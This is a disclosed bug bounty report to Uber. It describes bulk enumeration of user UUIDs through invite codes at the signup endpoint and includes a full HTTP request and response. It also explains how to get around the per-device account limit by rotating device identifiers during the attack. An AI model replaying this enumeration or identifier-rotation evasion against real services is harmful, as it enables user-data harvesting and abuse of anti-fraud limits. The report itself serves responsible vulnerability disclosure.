# Bulk UUID enumeration via invite codes

## Report Details
- **Report ID**: 145150
- **URL**: https://hackerone.com/reports/145150
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-06-16T11:31:28.594Z
- **Disclosed**: 2016-09-08T17:15:33.211Z

## Reporter
- **Username**: vijay_kumar
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: uber

## Vulnerability Information
It is possible to enumerate UUID via invite code. During signup if we enter invite code then ```create``` request's response contains ```inviter_uuid``` . As invite codes are public  so attacker can easily enumerate  bulk UUID . 

Here is sample request :-

```
POST /signup/clients/create HTTP/1.1
X-Uber-RedirectCount: 0
X-Uber-DCURL: https://cn-geo1.uber.com/
User-Agent: client/android/3.104.5
X-Uber-Origin: android-client
X-Uber-Device-Location-Latitude: 26.894606
X-Uber-Device-Location-Longitude: 75.7562847
Content-Type: application/json; charset=UTF-8
Host: cn-geo1.uber.com
Connection: Keep-Alive
Accept-Encoding: gzip
Content-Length: 1809

{
	"deviceData": {
		"androidId": "b3f675hc5e15531",
		"version": "3.104.5",
		"batteryStatus": "discharging",
		"carrier": "",
		"carrierMcc": "404",
		"carrierMnc": "59",
		"simSerial": "9915921251419234722",
		"cpuAbi": "armeabi, armeabi-v7a",
		"phoneNumber": "",
		"deviceIds": {
			"authId": "k361075b11131493a6061925",
			"permId": "k973d2529d728186b9063522cb48d74b",
			"deviceImei": "851639131157164"
		},
		"md5": "184ec02b309a23dedfc90f6bfe0dfab",
		"ipAddress": "192.168.0.171",
		"deviceModel": "HM NOTE 1LTE",
		"deviceOsName": "Android",
		"deviceOsVersion": "4.4.4",
		"imsi": "50459415423472",
		"batteryLevel": 0.81,
		"deviceAltitude": 0.0,
		"deviceLongitude": 75.7562847,
		"deviceLatitude": 26.894606,
		"locationServiceEnabled": true,
		"mockGpsOn": false,
		"emulator": false,
		"rooted": true,
		"course": 0.0,
		"speed": 0.0,
		"unknownSources": false,
		"horizontalAccuracy": 24.0,
		"wifiConnected": true
	},
	"device_ids": {
		"device_imei": "51639131957164",
		"googleAdvertisingId": "anba81e-ecde-419a-a1c4-0eb0f6768887"
	},
	"altitude": 0.0,
	"horizontal_accuracy": 24.0,
	"device_mobile_country_iso2": "in",
	"password": "vijay",
	"version": "3.104.5",
	"course": 0.0,
	"device_os": "4.4.4",
	"signup_form": "android",
	"first_name": "Test",
	"device_model": "HM NOTE 1LTE",
	"device_mobile_digits": "",
	"signup_session_id": "f8eb7f0-5ab5-433b-aa97-88d434fe2224",
	"longitude": 75.7562847,
	"app": "client",
	"promotion_code": "uber48",
	"mobile_country_iso2": "IN",
	"device_serial_number": "9CAE0F2D091",
	"speed": 0.0,
	"epoch": 1466074494001,
	"device_id": "r9ee4b0668ccbccdbb454c3c7791ee47",
	"email": "testh1vijay5@gmail.com",
	"last_name": "Account",
	"device": "android",
	"token_type": "cash",
	"latitude": 26.894606,
	"language": "en_US",
	"mobile": "97558 47368"
}
```

and response is-

```
{
	"rider_referral_url": "https://www.uber.com/invite/testa207ue",
	"last_name": "Account",
	"driver_referral_url": "https://partners.uber.com/drive/?invite_code=testa207ue",
	"national_id": null,
	"creationtime": "2016-06-16T11:03:03.997628+00:00",
	"give_get_amount": "₹50",
	"is_super_admin": false,
	"has_confirmed_mobile": false,
	"give_get_description": {
		"fine_print": "Every time a new Uber user signs up with your invite code, they’ll get ₹ 50 off each of their first 2 rides. \nOnce they take their first ride, you'll automatically get ₹ 50 off each of your next 2 rides. \nDiscounts apply automatically in your country and expire 3 months from their issue date. Offer not valid for uberTAXI.",
		"giver_promotion": {
			"headline": "Get ₹ 50 off each of your next 2 rides",
			"promotion_value_string": "₹ 50 off of next 2 rides",
			"details": "They get ₹ 50 off each of their first 2 rides and you will too, after their first ride.",
			"award_details": {
				"per_trip_max_value": "50.000",
				"max_value_amount": "100.000",
				"per_trip_value": "50.000",
				"type": "GiveGetTripCreditPromotion",
				"trips": 2,
				"currency_code": "INR"
			}
		},
		"invite_code": "testa207ue",
		"receiver_promotion": {
			"message_body": "I’m giving you ₹ 50 off each of your first 2 Uber rides. To accept, use code ‘testa207ue’ to sign up. Enjoy! Details: https://www.uber.com/invite/testa207ue",
			"headline": "Get ₹ 50 off each of your first 2 rides",
			"promotion_value_string": "₹ 50 off first 2 rides",
			"message_subject": "₹ 50 off each of your first 2 Uber rides",
			"award_details": {
				"per_trip_max_value": "50.000",
				"max_value_amount": "100.000",
				"per_trip_value": "50.000",
				"type": "GiveGetTripCreditPromotion",
				"trips": 2,
				"currency_code": "INR"
			},
			"details": "Get ₹ 50 off your first 2 Uber rides with invite code 'testa207ue'. Enjoy! Download the app: https://www.uber.com/invite/testa207ue"
		}
	},
	"referral_code": "testa207ue",
	"confirm_mobile_exempt": false,
	"confirm_mobile": false,
	"last_selected_payment_google_wallet_uuid": null,
	"first_name": "Test",
	"signup_promo_uuid": "6c94e187-fafe-45b3-af8b-a82fa7136e5c",
	"has_to_opt_in_sms_notifications": false,
	"uuid": "05faf97c-ad8f-4986-b504-4ebc63f80c29",
	"mobile_local": "+91 97558 47368",
	"confirm_email": false,
	"signup_promo_type": "GiveGetTripCreditPromotion",
	"picture_url": "https://d1w2poirtb3as9.cloudfront.net/default.jpeg",
	"country_id": 77,
	"language_id": 1,
	"promotion_code_id": 534264309,
	"last_selected_payment_profile_uuid": "073f4714-f999-4253-a3af-2895c783001e",
	"role": "client",
	"location": "00000",
	"has_confirmed_email": false,
	"is_restricted": false,
	"client_promotions": [{
		"display_date": "September 15, 2016",
		"code": "GG_INVITEE_zshtj4kvue",
		"redemption_count": 0,
		"updated_at": "2016-06-16T11:03:04+00:00",
		"promotion_id": null,
		"deleted_at": null,
		"id": 314578103,
		"revoked_at": null,
		"auto_applied": false,
		"uuid": "d56807ec-166b-42bc-8784-234e74b90e55",
		"display_location": "India",
		"promotion_code_id": null,
		"is_valid": true,
		"short_description": null,
		"display_discount": "₹ 150 OFF",
		"description": "Free trip up to ₹150 from Данила",
		"expires_at": "2016-09-15T11:03:04+00:00",
		"applied_by_client_uuid": "05faf97c-ad8f-4986-b504-4ebc63f80c29",
		"promotion_uuid": "6c94e187-fafe-45b3-af8b-a82fa7136e5c",
		"promotion_code_uuid": "d48cc4d3-d02c-4e61-98d1-e109f52e5b2f",
		"custom_user_activation_message": null,
		"ends_at": "9999-12-31T23:59:59+00:00",
		"client_uuid": "05faf97c-ad8f-4986-b504-4ebc63f80c29",
		"starts_at": "2016-02-15T18:30:00+00:00",
		"created_at": "2016-06-16T11:03:04+00:00"
	}],
	"email": "testh1vijay5@gmail.com",
	"username": "testh1vijay5@gmail.com",
	"picture": null,
	"is_autoban_whitelisted": false,
	"mobile_country_iso2": "IN",
	"gratuity": "0.2",
	"claimed_mobile_local": null,
	"email_confirm": false,
	"phone_number_full": "+919755847368",
	"banned": false,
	"mobile_country_id": 77,
	"promotion_code_uuid": "2ca62e26-06f7-48dc-bf8a-441602eaf91d",
	"tenancy": "uber/production",
	"mobile_country_code": "+91",
	"credit_balances": {},
	"trip_credit_balance_strings": [],
	"is_tester": false,
	"nickname": "testh1vijay5@gmail.com",
	"was_upgraded": false,
	"signup_promo_id": 332867,
	"mobile": "9755847368",
	"has_american_mobile": false,
	"has_opted_in_sms_marketing": false,
	"token": "e42f75a88fa243cdecfd2cef243f0c4c",
	"meta": {},
	"referral_url": "https://www.uber.com/invite/testa207ue",
	"is_admin": false,
	"is_temporary_admin": false,
	"inviter_uuid": "a5efac50-b706-47c7-997d-c992b85095ee",
	"last_trip_uuid": null
}
```

Second last line of response contains ```inviter_uuid``` .
Please note that uber only allow 3 account per device if we choose payment method as cash. But we can bypass it by taking androidId,simSerial,imsi,googleAdvertisingId,signup_session_id  in variable during Attack.
I  tested with 45 requests and all request were successful. 

Thanks

## Attachments
No attachments
